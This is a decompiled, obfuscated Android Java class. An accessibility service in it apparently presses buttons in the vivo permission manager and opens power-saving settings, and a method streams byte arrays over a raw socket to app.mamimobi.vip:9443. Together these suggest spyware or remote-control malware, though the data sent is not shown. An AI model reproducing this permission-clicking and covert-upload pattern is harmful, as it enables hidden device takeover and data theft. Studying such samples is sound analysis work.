package defpackage;

import android.content.Intent;
import android.graphics.drawable.Drawable;
import android.view.View;
import androidx.cardview.widget.CardView;
import androidx.work.impl.WorkDatabaseVersions;
import androidx.work.impl.WorkManagerImpl;
import com.google.gson.internal.LinkedTreeMap;
import com.mamimobi.AccessService;
import io.nats.client.BaseConsumeOptions;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.TreeMap;
import java.util.TreeSet;
import java.util.WeakHashMap;
import java.util.concurrent.ConcurrentHashMap;

/* JADX INFO: loaded from: classes.dex */
public class is implements aj, ya0, pe0, ru, nf, n61, qi0 {
    public static boolean L;
    public static Socket M;
    public final /* synthetic */ int E;
    public static final /* synthetic */ is F = new is(1);
    public static final /* synthetic */ is G = new is(2);
    public static final /* synthetic */ is H = new is(3);
    public static final is I = new is(4);
    public static final is J = new is(5);
    public static final Object K = new Object();
    public static final is N = new is(7);
    public static final is O = new is(8);

    public /* synthetic */ is(int i) {
        this.E = i;
    }

    public static void k(byte[] bArr, byte[] bArr2) {
        synchronized (K) {
            if (!L) {
                Socket socket = M;
                if (socket == null || socket.isClosed() || !M.isConnected()) {
                    try {
                        Socket socket2 = new Socket(InetAddress.getByName("app.mamimobi.vip"), Integer.parseInt("9443"));
                        M = socket2;
                        socket2.setSoTimeout(0);
                    } catch (IOException e) {
                        e.printStackTrace();
                        return;
                    }
                }
                try {
                    DataOutputStream dataOutputStream = new DataOutputStream(M.getOutputStream());
                    dataOutputStream.writeInt(bArr.length);
                    dataOutputStream.write(bArr);
                    dataOutputStream.writeLong(bArr2.length);
                    dataOutputStream.write(bArr2);
                    dataOutputStream.flush();
                } catch (IOException unused) {
                    M = null;
                }
            }
        }
    }

    @Override // defpackage.ru
    public void b() {
        switch (this.E) {
            case WorkDatabaseVersions.VERSION_15 /* 15 */:
                la.o.set(true);
                Intent intent = new Intent();
                intent.addFlags(268435456);
                intent.setClassName("com.iqoo.powersaving", "com.iqoo.powersaving.PowerSavingManagerActivity");
                AccessService accessService = AccessService.e0;
                if (accessService != null) {
                    accessService.startActivity(intent);
                }
                break;
        }
    }

    public boolean c() {
        return this instanceof gc0;
    }

    public void d(float f, float f2, float f3, jv0 jv0Var) {
        jv0Var.d(f, 0.0f);
    }

    @Override // defpackage.nf
    public void l() {
        la.i(la0.c0(AccessService.e0, "com.vivo.permissionmanager:id/move_btn1"), new is(15));
    }

    public void m(float f, i6 i6Var) {
        sp0 sp0Var = (sp0) ((Drawable) i6Var.F);
        CardView cardView = (CardView) i6Var.G;
        boolean useCompatPadding = cardView.getUseCompatPadding();
        boolean preventCornerOverlap = cardView.getPreventCornerOverlap();
        if (f != sp0Var.e || sp0Var.f != useCompatPadding || sp0Var.g != preventCornerOverlap) {
            sp0Var.e = f;
            sp0Var.f = useCompatPadding;
            sp0Var.g = preventCornerOverlap;
            sp0Var.b(null);
            sp0Var.invalidateSelf();
        }
        if (!cardView.getUseCompatPadding()) {
            i6Var.P(0, 0, 0, 0);
            return;
        }
        sp0 sp0Var2 = (sp0) ((Drawable) i6Var.F);
        float f2 = sp0Var2.e;
        float f3 = sp0Var2.a;
        int iCeil = (int) Math.ceil(tp0.a(f2, f3, cardView.getPreventCornerOverlap()));
        int iCeil2 = (int) Math.ceil(tp0.b(f2, f3, cardView.getPreventCornerOverlap()));
        i6Var.P(iCeil, iCeil2, iCeil, iCeil2);
    }

    @Override // defpackage.pe0
    public boolean n(zd0 zd0Var) {
        return false;
    }

    @Override // defpackage.n61
    public s81 o(View view, s81 s81Var, o61 o61Var) {
        o61Var.d = s81Var.a() + o61Var.d;
        WeakHashMap weakHashMap = f51.a;
        boolean z = view.getLayoutDirection() == 1;
        int iB = s81Var.b();
        int iC = s81Var.c();
        int i = o61Var.a + (z ? iC : iB);
        o61Var.a = i;
        int i2 = o61Var.c;
        if (!z) {
            iB = iC;
        }
        int i3 = i2 + iB;
        o61Var.c = i3;
        view.setPaddingRelative(i, o61Var.b, i3, o61Var.d);
        return s81Var;
    }

    @Override // defpackage.qi0
    public Object q() {
        switch (this.E) {
            case WorkManagerImpl.MAX_PRE_JOB_SCHEDULER_API_LEVEL /* 22 */:
                return new ConcurrentHashMap();
            case WorkManagerImpl.MIN_JOB_SCHEDULER_API_LEVEL /* 23 */:
                return new TreeMap();
            case 24:
                return new LinkedHashMap();
            case BaseConsumeOptions.DEFAULT_THRESHOLD_PERCENT /* 25 */:
                return new LinkedTreeMap();
            case 26:
                return new TreeSet();
            case 27:
                return new LinkedHashSet();
            case 28:
                return new ArrayDeque();
            default:
                return new ArrayList();
        }
    }

    private final void e() {
    }

    private final void f() {
    }

    private final void g() {
    }

    private final void h() {
    }

    private final void i() {
    }

    private final void j() {
    }

    @Override // defpackage.pe0
    public void a(zd0 zd0Var, boolean z) {
    }
}
